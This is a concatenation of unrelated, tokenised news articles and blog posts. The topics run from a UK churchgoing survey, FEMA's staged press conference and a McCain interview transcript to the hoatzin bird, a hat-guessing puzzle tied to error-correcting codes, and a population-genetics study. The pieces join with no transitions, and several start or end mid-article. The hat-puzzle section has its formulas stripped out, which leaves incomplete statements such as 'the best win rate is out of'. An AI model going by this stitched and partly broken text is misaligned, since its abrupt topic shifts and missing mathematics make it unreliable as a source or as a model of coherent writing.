Christian charity Tearfund 's survey of 7,000 people puts the UK among Europe 's four least observant countries .
Two - thirds of those polled had not been to church in the last year , except for baptisms , weddings or funerals - but 53 % identified themselves as Christian .
Tearfund said nearly three million more people would attend regularly if given the " right invitation " .
It said churches could do more to offer encouragement to potential worshippers .
The poll , conducted last year among people aged 16 and over , suggests that one in four UK adults attends church at least once a year .
REGULAR UK CHURCHGOERS
Northern Ireland : 45 % Scotland : 18 % England : 14 % Wales : 12 % Source : Tearfund
Tearfund said 53 % of people identified themselves as Christian , compared with almost three - quarters who had in the last census in 2001 .
But it said that its survey indicated that three million people who had stopped going to church , or who had never been in their lives , would consider attending " given the right invitation " .
This could be a personal invite , the chance to accompany a relative or friend , or the offer of help during difficult personal circumstances , it said .
Tearfund 's president , Elaine Storkey , told BBC Radio Five Live that a lot of people would be unsure what to expect if they did visit .
" The church for a lot of people is a very strange place these days .
They 're not familiar with what 's going on inside the building , with the form of service , with the way people gather , with what they say , how they pray .

" So the first thing they have really got to wake up to is that there is this big cultural gap between churched and non-churched . "
The Reverend Lynda Barley , head of research and statistics for the Church of England Archbishops ' Council , said Britain was a nation " seeking identity " .
" At first glance , the past has been left behind to wholeheartedly embrace individual choice and secular consumerism prominently among its modern - day gods , " she said .
" But research is beginning to show that there is more , far more , going on out of apparent sight in everyday life in Britain today . "
' Overwhelmingly ' secular
The report , Churchgoing in the UK , found that Northern Ireland was the most observant region , with 45 % of people attending services every month .
Regular churchgoing was also three times higher among adults from black ethnic groups than white .
National Secular Society executive director Keith Porteous
Wood said the poll provided the " most authoritative evidence " yet that Britain had become an " overwhelmingly " secular society .
He said the survey showed that 40 % of the population said they ' have no religion '
" It shows that two thirds of the UK population ' have no connection ' with the church and that only a quarter ' believe in a personal god ' , just one of the several minimum requirements to qualify as a Christian , " he said .
The nations in between remain shrouded in Seventh Floor mystery at State because China and France , which conspired against the U.S. , should have voted for us .
There is an unwritten rule that permanent Security Council members must vote for each other 's candidacy on such groups .
If it became public that the rule was broken , the faithless member would lose much diplomatic leverage .
To throw nosy journalists off the scent , U.N. delegates explain that not all votes are instructed by foreign ministries in national capitals , whose exchanges can be read or overheard .
Thanks to the U.N. 's unconscionable cloak of secrecy , delegates in New York can easily be induced to switch their votes by a swap of diplomatic favors or a promise of lucrative trade or more personal emoluments with their capitals none the wiser .
In preventing the U.S. from again daring to question the human rights abuses in China , France had to persuade its neighbors not to agree on a ' ' lean slate ' ' of three nations to be elected from the '' Western European and other ' ' grouping , which includes us .
Accordingly , four nations competed ; when our European allies delightedly chose Austria over the U.S. , we were out on our ear .
( If Russian tanks roll , call Vienna . )
The blame - America set here promptly suggested we deserved payback for opposing the treaty to allow dictators to haul Americans into a global court .
And yesterday -- even as Chinese and Cuban Communists moved to strip human rights groups like Freedom House of accreditation -- Amnesty International celebrated the U.N. silencing of the U.S. by equating our use of land mines to protect our troops in Korea with China 's torture of its dissidents .
Our House of Representatives reacted in a measured way , not withholding our arrears but signaling a hard look at next year 's dues :
No play , no pay .
Most Americans who care are disgusted with Western Europe 's craven cave - in on human rights after China 's threat to '' smash a rock ' ' on brave Danes who dared a few years ago to criticize its repression .
SOMEWHERE in NORTHERN IOWA —
The unthinkable has happened .
Senator John McCain met a question , while sitting with reporters on his bus as it rumbled through Iowa today , that he could n’t – or perhaps would n’t – answer .
Did he support the distribution of taxpayer - subsidized condoms in Africa to fight the transmission of H.I.V.?
What followed was a long series of awkward pauses , glances up to the ceiling and the image of one of Mr. McCain ’s aides , standing off to the back , urgently motioning his press secretary to come to Mr. McCain ’s side .
The upshot was that Mr. McCain said he did not know this subject well , did not know his position on it , and relied on the advice of Senator Tom Coburn , a physician and Republican from Oklahoma .
His press secretary , Brian Jones , later reported that Mr. McCain had a record of voting against using government money to finance the distribution of condoms .
All this took place on the second day of the reprise of the “ Straight Talk Express ” bus trips that Mr. McCain made a central part of his campaign in 2000 .
It also comes as Mr. McCain has eagerly been trying to ease strains with social conservatives in the party who , for the most part , do not support using government money to pay for condoms .
A transcript of the encounter follows .
( Weaver is John Weaver , his senior adviser , and Brian is Mr. Jones , his press secretary ) :
Reporter : “ Should U.S. taxpayer money go to places like Africa to fund contraception to prevent AIDS ? ” Mr. McCain : “ Well I think it ’s a combination .
The guy I really respect on this is Dr. Coburn .
He believes – and I was just reading the thing he wrote– that you should do what you can to encourage abstinence where there is going to be sexual activity .
Where that does n’t succeed , than he thinks that we should employ contraceptives as well .
But I agree with him that the first priority is on abstinence .
I look to people like Dr. Coburn .
I ’m not very wise on it . ”
( Mr. McCain turns to take a question on Iraq , but a moment later looks back to the reporter who asked him about AIDS . )
Mr. McCain : “ I have n’t thought about it .
Before I give you an answer , let me think about .
Let me think about it a little bit because I never got a question about it before .
I do n’t know if I would use taxpayers ’ money for it . ”
Q : “ What about grants for sex education in the United States ?
Should they include instructions about using contraceptives ?
Or should it be Bush ’s policy , which is just abstinence ? ” Mr. McCain : ( Long pause ) “ Ahhh .
I think I support the president ’s policy . ”
Q : “ So no contraception , no counseling on contraception .
Just abstinence .
Do you think contraceptives help stop the spread of HIV ? ” Mr. McCain : ( Long pause )
“ You ’ve stumped me . ” Q : “ I mean , I think you ’d probably agree it probably does help stop it ? ” Mr. McCain : ( Laughs )
“ Are we on the Straight Talk express ?
I ’m not informed enough on it .
Let me find out .
You know , I ’m sure I ’ve taken a position on it on the past .
I have to find out what my position was .
Brian , would you find out what my position is on contraception – I ’m sure I ’m opposed to government spending on it , I ’m sure I support the president ’s policies on it . ”
Q : “ But you would agree that condoms do stop the spread of sexually transmitted diseases .
Would you say : ‘ No , we ’re not going to distribute them , ’ knowing that ? ” Mr. McCain : ( Twelve - second pause )
“ Get me Coburn ’s thing , ask Weaver to get me Coburn ’s paper that he just gave me in the last couple of days .
I ’ve never gotten into these issues before . ”
This went on for a few more moments until a reporter from the Chicago Tribune broke in and asked Mr. McCain about the weight of a pig that he saw at the Iowa State Fair last year .
Mr Rees said it was ' funny ' to watch court staff counting the coins
Michael Rees , 41 , of Tonteg , south Wales , was told the court did not have to accept the 4,000 coins .
He said his 2003 conviction was a " raw deal " and that he was prepared to go to jail if he could not pay in coins .
Rhondda magistrates said the Coinage Act of 1971 meant the court did not have to take more than 20 p in copper .
Mr Rees , was convicted of careless driving by Rhondda magistrates in 2003 and was told to pay a £ 250 fine .
An unsuccessful appeal added £ 400 costs .
He has so far paid £ 540 , but only by going to a bank and changing his £ 40 instalments into 4,000 one penny pieces .
It means staff have to spend two or three hours counting out pennies and bagging them
Court clerk Steve Miller
He said : " This is the way I feel .
I could not prove my innocence .
" I take all the pennies out of each individual bag .
I rip the bags open and I empty them in a big sack so it gives them a job to count them .
It 's funny to watch .
" They are refusing to accept any more of my money in pennies .
There is no such thing as the Coinage Act .
It is legal tender , it belongs to the Queen .
" If I am not allowed to pay the pennies then I 'm going to be in contempt of court .
I 'm willing to go to prison for it .
" I 'm going to pay it the way I feel I should pay it .
I 've been dealt a raw deal .
I 'm unemployed and I 'm struggling to pay . "
' Aggrieved '
The clerk to the Miskin , Cynon Valley and Merthyr Tydfil magistrates ' courts , Steve Miller , defended the right not to accept the coppers as legal tender .
He said : " Mr Rees is not unique .
I have had a number of people who feel aggrieved about a financial penalty and try to pay the fines in pennies .
" It does happen every now and again .
If someone is trying to make a point , really I will always say no .
" The reason we have always said no is it means staff have to spend two or three hours counting out pennies and bagging them .
" Staff are employed to be doing different things from that . "
Mr Miller said exceptions were made for " genuine cases " .
A spokesman for HM Court Service said : " Anything over 20 p in bronze is not legal tender .
You do n't have to accept it . "
FEMA Apologizes After Sham News Conference FEMA has apologized for holding sham news conference on fire response .
Oct. 26 , 2007  --
It looked like any other Washington press briefing , with a public affairs official walking up to a podium , introducing a government official and kicking off a press conference .
But what happened next raised the ire of the news media and ticked off Bush administration officials .
Tuesday the Federal Emergency Management Agency announced it was holding a news conference to answer reporters ' questions about the federal agency 's emergency response to the Southern California wildfires .
The agency gave reporters just 15 minutes notice to attend , and those members of the media who called in via phone lines could listen to the event but were not able to ask questions .
FEMA 's Deputy Administrator Harvey Johnson conducted the event like a regular press briefing , assuring those in attendance that FEMA -- the agency that performed so poorly in the aftermath of Hurricane Katrina -- was responding well to the disaster in Southern California .
" The report basically is that were doing a fine , doing a pretty good job , " Johnson told the audience .
The event went smoothly .
That is , until the news media discovered that the press conference was n't exactly a press conference at all .
Unlike most press briefings , this one was missing a key component : members of the press .
FEMA : No Reporters ?
No Problem .
No reporters ?
No problem for FEMA .
The agency filled the press room with its own public affairs personnel who asked questions .
It looked real enough for cable networks to briefly air the live event .
" I 'll be glad to take some of your questions , " Johnson said .
" Are you happy with FEMA 's response so far ? " one staffer asked .
" I 'm very happy with FEMA 's response so far , " Johnson replied .
And so it went for more than 10 minutes , without any journalists .
Kicking Katrina Comparisons
The inevitable comparisons to Katrina came up during the questioning , giving Johnson an opportunity to tout the agency 's improved disaster response .
He said , " In lessons learned from Katrina , it 's like , is there day and is there night ? "
" But what you 're seeing now is a very smoothly , very efficiently performing team , " he said .
After the event was over , FEMA staff members went back to their day jobs , perhaps unaware of the fallout to come .
' Inexcusable and Offensive '
Over the next few days , the incident became fodder for news blogs .
Friday a spokeswoman for the Department of Homeland Security , which oversees FEMA , said Secretary Michael Chertoff was not pleased with the decisions made by agency staff .
" This is simply inexcusable and offensive to the Secretary [ Chertoff ] that such a mistake could have been made , " Laura Keehner said Friday on a conference call with the media .
" We have made it clear stunts such as this will not be tolerated or repeated . "
Keehner noted that the department is looking into the possibility of reprimanding FEMA staff .
White House Press Secretary Dana Perino told reporters Friday that the White House did not know about FEMA 's plan beforehand , and said , " It was just a bad way to handle it , and they know that . "
" It 's not something I would have condoned .
And they , I 'm sure , will not do it again . "
FEMA Issues Apology
FEMA released a statement of apology Friday afternoon .
In the statement , Johnson said FEMA is reviewing its procedures to ensure that future communications with the press are " straightforward and transparent . "
" We can and must do better , and apologize for this error in judgment , " Johnson said .
But he asked the media not to focus on that misjudgment , and instead concentrate on the " real story " of the successes of the efforts in California .
Turns out the U.S. government still believes the news media is needed -- at least at press conferences .
We of the Minneapolis and founding chapter of www.ImpeachforPeace.org recently received the following report from member Natalie Morrison about her speaking at the July 4th rally in Madison , Wisconsin .
Ms. Morrison is starting up a Wisconsin chapter of IFP :
alt=” impeach_rally_7_4_07_005.jpg ”
( Impeachment Rally July 4th at State Capital in Madison , Wisconsin )
Friends ,
I attended the Madison Impeachment rally at Capital Square today .
There were about 75 - 100 in the crowd .
We had several speakers , and yes , I took the mike .
It was n’t bad at all ( I tend to shy away from public speaking , but my passion for justice and my desire to start a Madison chapter of impeachforpeace.org was too important ) .
I introduced myself as a member of the Minneapolis Chapter of impeachforpeace.org and now the organizer of impeachforpeace.org , Madison Chapter .
I told them about our organizaton and our mission … nonpartisan , nonviolent , sole purpose of impeachment of the tyrants : Bush , Cheney and Gonzalez and any person who abuses the power of office .
I was able to give them the good news about Rep. Keith Ellison ( D - MN ) as the 10th signer of H. Res. 333 , to which I got cheers and applause .
I talked about pressuring the city council and Cam Gordon ( I did indirectly plug the Green Party with their stance on impeachment ) and told them that we are rallying the community : organizatons , businesses and individuals to demand an impeachment resolution .
I talked about the City Council and how they hide behind the excuse that it is not in the purview of their work .
I said , “ We say , it is your first , your primary duty and responsibility of your office ! ” ( cheers ) I said the way to get results is to inundate the offices with calls , letters , signed demands / support for action from members of the community .
Anyway , I was only allowed two minutes , and think that I got a lot across .
I did not get to the DYI Impeachment Memorial , which I really wanted to , but will as soon as I can .
About 6 - 7 people approached me and asked when the next meeting is .
I told them that I just arrived and have n’t set a day / time yet but will contact them ( I got their contact info ) so … please help me with suggestions as to what my next step sould be .
I also gave them our card and directed them to our website .
I will go to the next impeachment coalition meeting this Sunday .
I do not want to make people feel that I am undermining their own organizatons , but truly feel that WE have incredible resources , experience , name association , tactics and strategies , and , principles , that are effective and direct .
I want to emphasize that we all must work together at all times and that several approaches are better than one .
Please help me with advice on how to set up an initial meeting and what I should emphasize .
I intend to use all of our past and present work as templates and tools for action in Madison .
Peace and Justice ,
Natalie
Wisconsin : it 's home to broomball , sharp cheddar , and ( strange but true ) cranberry bogs .
This last week , the Badger State added " home of legal guitar tablature service " to its list of distinctives .
Madison - based Musicnotes announced a licensing agreement with the Harry Fox Agency that will bring legal , ad - supported tabs back to the ' Net .
Tablature is a simplified system of guitar notation that is useful for players who can't read the standard notes and staff .
Enthusiasts across the Internet created tens of thousands of these tablature files and sent them to sites like the Online Guitar Archive ( OLGA ) until the music industry cracked down on the practice .
Claiming that they alone have the right to reproduce music ( even if that music is written down by volunteers ) , the Music Publishers Association and its licensing subsidiary the Harry Fox Agency managed to shutter the major tablature sites in the US last year .
Now , under a new agreement reached with Musicnotes ( one of the largest publishers of sheet music ) , Harry Fox will allow the company to offer tablature so long as it splits its advertising revenue with the music publishers .
The new service will launch this summer at MXTabs.net , which Musicnotes recently acquired .
" Musicnotes proves the viability of a copyright - friendly , ad - supported guitar tab web site , " said Gary Churgin , the CEO of Harry Fox , in a statement .
" HFA has expanded its licensing and royalty distribution capabilities to support this kind of service , and we will continue to adapt to new licensing opportunities and models such as this to provide the most comprehensive service for our publishers . "
There 's one major snag , though : even though a deal is in place with Harry Fox , each copyright owner still needs to agree before Musicnotes can put tablature from their musicians online .
This means that the archive will likely develop in a piecemeal fashion as publishers sign on .
In addition , the site will be making its money from users , who create and edit the tabs in question .
Users get free access to legal tabs , while Musicnotes and music publishers get the cash .
Will guitar players want to donate their time and energy to propping up The Man ?
Probably , if the site is slick , enough publishers sign on , and everything is fast and simple to use .
The success of sites like YouTube is proof that plenty of people are willing to work for free when it comes to content they love , and this looks to be the only way to do it legally in the US at the moment .
Imagine working with a sociopath .
Knowing that no matter how much you aspire to live to the credo of “ doing unto others , ” your counterpart will always put their needs above yours .
Netting it out : if you are willing to give , they are willing to take .
If this was your reality and your accommodating nature led you to enable such behavior versus setting hard boundaries , then you are practicing idiot compassion .
Similarly , imagine encountering a drug addict on the street who is homeless and sickly looking .
They approach you and ask for money so they can buy some food .
You feel for their suffering so you give them a couple of bucks .
You are practicing idiot compassion .
What is idiot compassion ?
It is a Buddhist axiom that describes self - deluding behaviors in the guise of sympathy / empathy that manifest in the destruction of yourself or others .
Idiot compassion results from failing to heed the essentialness of self - preservation when confronted by societal dangers ( ignorance ) .
Or , from seeing such dangers as the ultimate test of faith ( martyrdom ) .
Or , confusing empathy with enablement .
In terms of avoiding the path of idiot compassion , this is an area where I have moral clarity but I have certainly encountered my share of conflict - avoidant types that have let themselves be snookered into such behaviors .
But recently , through my career coach ( think : professional shrink ) , I came to realize that I was practicing idiot humility .
What is idiot humility ?
My definition for it is an inability to allow oneself to aspire to greatness , to set and maintain an expectation of breakout success , or just generally see oneself as deserving of living their life ’s dreams .
This sounds very obvious ; that it should be natural for all people to swing for the fences of life , to expect that they will hit the winning shot or to see themselves as worthy of all the breaks .
But , the funny thing in my case was that because I understand how much luck is involved , how thin the line is between success and failure and how important it is to appreciate your lot in life , to enjoy it and have fun , to savor now versus dwelling on tomorrow that I held myself back in the name of humility .
What I have since realized is something that I had always preached but only now fully practice .
Namely , that we have a limited time on the planet and as such , must “ own ” in the pragmatic sense the path that drives us forward in life .
That having defined such structure to our existence , gravity is destined to become our friend versus an enemy that must be fought , ignored or minimally , avoided making eye contact with .
I am compassionate and practice humility but I am an idiot no more .
New Haven
AT his confirmation hearings last week , Michael B. Mukasey , President Bush ’s nominee for attorney general , was asked whether the president is required to obey federal statutes .
Judge Mukasey replied , “ That would have to depend on whether what goes outside the statute nonetheless lies within the authority of the president to defend the country . ”
I practiced before Judge Mukasey when I was an assistant United States attorney , and I saw his fairness , conscientiousness and legal acumen .
But before voting to confirm him as the nation ’s chief law enforcement officer , the Senate should demand that he retract this statement .
It is a dangerous confusion and distortion of the single most fundamental principle of the Constitution — that everyone , including the president , is subject to the rule of law .
It is true that a president may in rare cases disregard a federal statute — but only when Congress has acted outside its authority by passing a statute that is unconstitutional .
( Who gets the last word on whether a statute is unconstitutional is something Americans have long debated and probably will always debate . )
But that is not what Judge Mukasey said .
What he said , and what many members of the current administration have claimed , would radically transform this accepted point of law into a completely different and un-American concept of executive power .
Post editor says Bush , Gonzales should be tortured Nick Juliano

An associate editor and columnist for the Washington Post says that until George W. Bush and others in his administration endure the " harsh " treatment to which terrorism suspects are subjected , then Bush " will be remembered as the president who tried to justify torture . "
Saying his proposal is a " serious " alternative to Jonathan Swift 's " modest proposal , " the Post 's Eugene Robinson says Bush should endure the same detainee treatment he authorized , which " international conventions deem torture . "
" My proposal on torture is serious , " Robinson wrote on a washingtonpost.com discussion board Sunday .
" Let me know if you agree : Bush administration officials who claim the " harsh " interrogation techniques being used on terrorism suspects are not torture should have to undergo those same techniques .
Personally .
Repeatedly . "
The New York Times revealed last week that secret Justice Department documents explicitly authorized " a combination of painful physical and psychological tactics , including head - slapping , simulated drowning and frigid temperatures . "
Bush repeated denials that the US does not torture prisoners , although he has not discussed what specific tactics are used .
" Clearly , he is using a narrow definition of torture :
If we have n't actually put anybody on the rack or pulled out his fingernails , we have n't committed torture , " Robinson writes .
" Until George W. Bush can say , ' Hey , I 've been waterboarded , and it was n't so bad , ' or Alberto Gonzales can say , ' To tell the truth , spending those three days naked in a freezing - cold cell was n't painful or anything , ' then I 'll continue to believe that history will condemn this administration for a shocking lapse of moral judgment .
Bush will be remembered as the president who tried to justify torture . "

In South America , in the swamps of the Amazon and Orinoco rivers , lives a very unusual bird .
The hoatzin is a pheasant - sized enigma .
The official national bird of Guyana , the hoatzin has defied attempts of ornithologists to place it in its proper place among the families of birds .
No matter where it is placed , the hoatzin simply does not appear to fit .
While bearing superficial resemblance to several other bird species , the hoatzin has many peculiarities that set it apart from the rest .
These oddities include some very primitive traits not seen in most birds since the Jurassic period , coexisting with characteristics which are otherwise unheard of among birds .
The first distinctive peculiarity of the hoatzin can be seen most easily on its chicks .
They have two claws on each wing , which they use for clambering about the trees .
Adults retain the claws , though they do not use them .
Few other modern birds have such a thing .
However the fossil record shows that several prehistoric birds had such claws , including the earliest and most famous of the ancient birds – Archaeopteryx .
The second peculiarity of the hoatzin has earned it one of its nicknames – the stinkbird .
The bird has a strong , unpleasant , manure - like smell , which serves to drive off predators , including humans .
Despite their resemblance to game birds and their slow , awkward flight , the hoatzin remains largely unmolested because it makes extremely unappetizing eating .
Only during times of famine will locals consider hunting it for food , and even then reluctantly .
The source of the off - putting aroma is a feature unique among birds : the hoatzin has evolved foregut fermentation to extract nourishment from leaves .
Foregut fermentation is seen frequently in larger mammals .
Cows , sloths , kangaroos , and others have all developed foregut fermentation as a way to extract maximum nutrition from the relatively poor food value of leaves and grasses .
Bacteria in the upper part of the digestive tract help to break down cell walls , and the resultant cud is then reprocessed to extract more nutrients .
How the hoatzin came to develop it is a mystery .
Despite the abundance of leaves in the tropics , no other bird has any kind of foregut fermentation .
Indeed , the scientists studying the hoatzin seem amazed that the bird manages its digestive feat with such a small space to work in .
Cows stomachs , after all , are huge .
Today , the ornithological consensus is that the hoatzin is the last surviving species of a genetic line that branched off from the rest of the birds 64 million years ago .
Whether it ’s the most primitive of birds or the most modern , the hoatzin has little to worry about as it feeds its young on cud and merrily emanates its perfume of fermenting foliage .
Why should it change , when what it has works so effectively ?
The odd collection of traits makes the stinkbird a highly efficient eating machine and very unappetizing prey , which is all that matters when the game is survival .
With most of the growth spreading unchecked on the Louisiana side , where Texas residents say the authorities have been preoccupied with Hurricane Katrina recovery , local advocates raised $ 35,000 for a two - mile net , put up in June , to seal off Caddo Lake ’s more contaminated eastern half .
“ We just stuck our necks out , ” said Paul Fortune , a contractor who has lived his whole life on the lake .
“ We just did it . ”
But propagating leaves still float through gaps left open for boats , and are spread by the boats themselves .

In one area of Louisiana , along a thicket of cypresses called the Big Green Brake , the Salvinia has already grown out into the lake as a luminescent green crust over the water .
“ It ’s at the stage where it starts to lose its eerie beauty and starts to look like a real monster , ” said Mr. Canson , the prow of his motorboat poking cracks in the matted covering like an icebreaker .
Even flamethrowers have failed to kill it , he said .
And beetles that devour the plant elsewhere die in the Texas cold .
Now chemical weapons have been thrown into the battle .
Mike Turner , a burly boat mechanic who calls himself part of the “ Caddo Navy , ” has set aside his business to go out daily in his small boat for $ 25 an hour to spray Salvinia infestations with a government - approved herbicide mixture of diquat and glyphosate and surfactants to make it stick to the leaves .
“ It gets in the water hyacinth and it hides , like it ’s a thinking animal , ” said Mr. Turner , removing the surgical mask that protects him from the chemicals .
“ I ’m finding stuff that was not there two days ago , ” he said , mopping his brow in the rising morning heat .
He said he felt the task was hopeless at first and considered moving but changed his mind .
When he was born 40 years ago , he said , his parents dipped his feet in the lake , and he did the same 12 years ago with his newborn daughter , Patte .
I guess since my previous hat color guessing problem was so popular , I might as well talk about the other one I know .
However , this one is n’t meant to attack the foundations of mathematics .
The problem is as follows :
Three people are sitting in a circle .
Black or white hats ( 50 % chance of each ) will all be placed on their heads , and they will be able to see everyone ’s hat color but their own .
They will all simultaneously write down on a piece of paper either “ Black ” , “ White ” , or “ Pass ” , trying to guess their own hat color .
All the people collectively win ( whatever that means ) if at least someone guesses their hat correctly and no one guesses incorrectly .
They lose if anyone guesses incorrectly , or everyone passes .
If they can agree on a strategy beforehand , what is their best chance of winning ?
Again , there is the problem that no information can be conveyed to someone about their own hat color , so they would seem to be guessing blindly ( talking and facial expressions are prohibited ) .
However , they can still win 75 % of the time .
Figure it out !
Once you solve the easy version of this puzzle , the harder version is with larger numbers of people .
As a partial spoiler , stick to , where the best win rate is out of .
How is this possible ?
( Answer below the fold )
The trick to the puzzle is realizing that , even though any specific person who elects not to pass has only a 50 % chance of being right , the strategy can be chosen so that the wrong guesses are all concentrated into a small number of possibilities .
That is , because you only need one right guess to win and multiple wrong guesses do n’t make a loss worse , the strategy should attempt to make as many people wrong simultaneously if anyone is going to guess wrong .
The three - person case makes a good example .
Consider the following strategy :
If you see two hats of the same color : Guess the opposite color .
If you see two different hat colors : Pass .
What happens ?
It ’s not hard to write down all the possibilities :
3 black hats : Everyone sees two black hats , and guesses White .
Everyone is wrong .
2 black hats , 1 white hat :
The people in black hats see both colors and Pass ; the person in the white hat sees two black hats and says White .
One person is correct and everyone else passed .
1 black hat , 2 white hats :
This is identical to the previous case , with colors reversed .
Its a win .
3 white hats :
This is identical to the first case , with colors reversed .
Its a loss .
So unless all three hats were the same color , everyone won .
However , the chances of all three hats being the same color is only 1 in 4 , so its a win 75 % of the time .
Notice that the key was getting everyone to be wrong at the same time , but only having one correct guess in winning situations .
Ok , what about more people , say , of them ?
Well , we need a strategy where the wrong guesses are concentrated and the right guesses are spread out .
Let ’s make this a little bit more mathematical , by turning white hats into 1s and black hats into 0s .
Now , a possible hat scenario is a sequence of binary digits , and every sequence is equally likely .
Since the optimal strategy seems to be when all the wrong guesses happen simultaneously , we need to agree on some sequences that will be the wrong sequences , that is , the scenarios where everyone will guess incorrectly .
How does this work ?
Say is one of the agreed upon wrong sequences ( this is for ) .
Then , if someone looks around and sees all zeros / black hats , they will guess white .
That way , everyone will be wrong if it is all black hats ; but if there is exactly one white hat , everyone wins !
Since it is times more likely for there to be exactly one white hat than no white hats , this seems to work pretty well .
The general strategy if you have a whole bunch of wrong sequences is for everyone to look around , and :
If it looks like you might be in a wrong sequence , guess the opposite possibility .
If you are definitely not in a wrong sequence , pass .
( Note that we are assuming that no two wrong sequences differ by a single digit , so that there is always an ‘ opposite possiblity ’ )
How well does this strategy work ?
It loses every wrong sequence .
It wins every sequence that differs from a wrong sequences by exactly one digit .
It loses every sequence that differs from every wrong sequence by at least two digits ( since everyone passes ) .
So what we want is a collection of wrong sequences that are evenly spread out amongst the possibilities , ie , we want to ‘ cover ’ as many possibilites as possible with the fewest number of wrong sequences .
This is actually a problem that real people care about , even some who do n’t wear hats .
This is ( roughly ) the problem of finding an error correcting code .
Sometimes , one computer will be sending another computer information in the form of a sequence of 1s and 0s , and by some fluke a single digit will get flipped .
The goal of error correcting codes is to turn the sequence of 1s and 0s you want to send into a longer sequence , which has the property that the receiving computer can tell if a digit got flipped and repair it .
A silly example is the Tripling Code , where if what I want to do is send you , I instead send you ( we always agree on what code we are using ahead of time ) .
Now , if one digit gets flipped , you will see two of the three copies of the sequence agreeing and one differing , and you will know what I was trying to say .
However , this is a wildly inefficient code , since it takes three times as long to say anything .
What does an error - correcting code look like ?
Well , we agree ahead of time upon which possible sequences are the codewords ( ie , the ones that are correct ) , and how to turn them into the messages we really wanted to send .
Then , if you get something that differs from a codeword by exactly one digit , you know how to correct it ( this is assuming that the codewords are far enough apart that there is only one close one ) .
So the goal for making an efficient code is to pick codewords spread apart evenly enough that as many possible sequences are exactly one away from a codeword .
This is exactly what we were looking for with our ‘ wrong sequences ’ , even though the names were different .
Therefore , we can invoke some fancy error - correcting codes to find the optimal hat guessing strategy .
In particular , if the number of people / length of sequence is , there is a ‘ perfect code ’ called the Hamming code , which will give us a choice of wrong sequences such that every possibility is either 1 ) a wrong sequence , or 2 ) exactly 1 digit away from a wrong sequence .
Hence , this is best possible strategy for hat guessing .
I am not going into the details of the Hamming codes , since the important thing here is that they exist .
However , this only solves the problem for a very specific number of people .
What about other numbers ?
Theres a complication in these cases , in that its impossible to have a perfect code .
That is , it is impossible to choose wrong sequences so that every possible sequence is either wrong , or one digit away from exactly one wrong sequence .
We can ask what the nearest possibility to a perfect code is , but its not clear which way to be less than perfect is optimal :
1 ) Having some of the correct guesses overlap , that is , having some wrong sequences differ by 2 digits .
2 ) Having some sequences which are lost because everyone passes .
3 ) Most significantly , moving away from the ‘ wrong sequence ’ strategy .
The last one , which I would guess is the correct way to proceed , is bad because the tools from computer science become useless rapidly .
I really have no idea what the optimal solution looks like here .

Mr. Bowen said that because he suspected that completed projects were not being maintained , he had ordered his inspectors to undertake a wider program of returning to examine projects that had been completed for at least six months , a phase known as sustainment .
Exactly who is to blame for the poor record on sustainment for the first sample of eight projects was not laid out in the report , but the American reconstruction program has been repeatedly criticized for not including in its rebuilding budget enough of the costs for spare parts , training , stronger construction and other elements that would enable projects continue to function once they have been built .
The new reports provide some support for that position : a sophisticated system for distributing oxygen throughout the Erbil hospital had been ignored by medical staff members , who told inspectors that they distrusted the new equipment and had gone back to using tried - and - true oxygen tanks — which were stored unsafely throughout the building .
The Iraqis themselves appear to share responsibility for the latest problems , which cropped up after the United States turned the projects over to the Iraqi government .
Still , the new findings show that the enormous American investment in the reconstruction program is at risk , Mr. Bowen said .
Besides the airport , hospital and special forces barracks , places where inspectors found serious problems included two projects at a military base near Nasiriya and one at a military recruiting center in Hilla — both cities in the south — and a police station in Mosul , a northern city .
A second police station in Mosul was found to be in good condition .
The dates when the projects were completed and deemed successful ranged from six months to almost a year and a half before the latest inspections .
But those inspections found numerous instances of power generators that no longer operated ; sewage systems that had clogged and overflowed , damaging sections of buildings ; electrical systems that had been jury - rigged or stripped of components ; floors that had buckled ; concrete that had crumbled ; and expensive equipment that was simply not in use .
Curiously , most of the problems seemed unrelated to sabotage stemming from Iraq ’s parlous security situation , but instead were the product of poor initial construction , petty looting , a lack of any maintenance and simple neglect .
Skeleton Discovery Shocks German Village Missing Doctor Lay Dead in Garage for 22 Years
A doctor who went missing 22 years ago has been found dead in the loft of his garage after apparently committing suicide in 1985 .
His wife and daughter were unaware they were living meters away from his corpse .
A new study asks an interesting genetics question : if there was a gene that controlled homosexuality — and hence limited reproduction — how could it be favored to exist ?
If there is a gene that causes one to not reproduce , natural selection would dictate that it cannot survive long in a population , since it is not being passed on to future generations .
A new paper in the Proceedings of the Royal Society is using population - genetics modeling to try and answer why a theoretical gene predisposing an individual to homosexuality could spread in a population .
It needs to be mentioned that this is merely a theoretical study , and that there is no known gene that dictates one 's sexuality .
However , there is evidence that at some level genetics plays a role .
It is known that human twins are more likely to both be gay when compared with non-identical siblings .
It has also been reported that male homosexuality is often inherited from the maternal line , suggesting that a gene on the X chromosome may play some role .
The question then becomes : if a gene existed that caused one to have no desire to reproduce ( through heterosexual intercourse ) , how can this theoretical gene persist throughout generations ?
The theoretical study by Gavrilets and Rice looked at a single gene with two alleles ( variants ) and examines three previously reported hypotheses as to how this gene can persist in a population .
It should be noted that this model did not strictly classify an individual as straight or gay , but determined the level of homosexual activity by relating it to the fitness within the model .
The first mechanism examined is one of overdominance , where in this scenario if the offspring only receives the ' gay allele ' from one parent ( heterozygous ) , then they would have a competitive reproductive advantage over others in the population .
Here the ' gay allele ' would need to be received from both parents ( homozygous ) in order for the offspring to exhibit homosexuality and have a reproductive disadvantage .
The next hypothesis is one of kin altruism , where homosexuals would help their own family members , thereby increasing the family 's fitness and allowing the gene ( which would be present in the family group ) to be passed on to the next generation .
The final previously posited hypothesis , sexually antagonistic selection , is that — in the case of male homosexuality — the allele would result in a fitness loss for male offspring , but a fitness gain in female offspring .
The gain in fitness for female offspring would potentially result in more offspring in the next generation having this allele .
Through modeling of classical population - genetics equations , the authors describe the evolution and frequency of these two alleles throughout a large population .
The authors find conditions in which overdominace or sexually antagonistic selection hypotheses could lead to a stable population with this homosexual gene in place when it is located on autosomes ( non-sexual chromosomes ) or on the X chromosome .
The models found that under the sexually antagonistic selection , the homosexual allele would become very prevalent , provided that those who carried two alleles of it were generally bisexual .
This is an interesting hypothesis , which seems to hearken back to the work of Kinsey in the late 1940's and early 1950's where he suggested that sexuality was a spectrum and people were not fully straight or gay , but existed somewhere in between .
This work at hand represents a interesting study into the ' Darwinian paradox of male homosexuality ' .
Even though the study was only theoretical , it produced some interesting results and shows what can be done with modeling and simulation , a field I am partial to .

Dreaming occurs in the fifth stage of sleep .
Sleep is one of those funny things about being a human being -- you just have to do it .
Have you ever wondered why ?
And what about the crazy dreams , like the one where a bad person is chasing you and you can't run or yell .
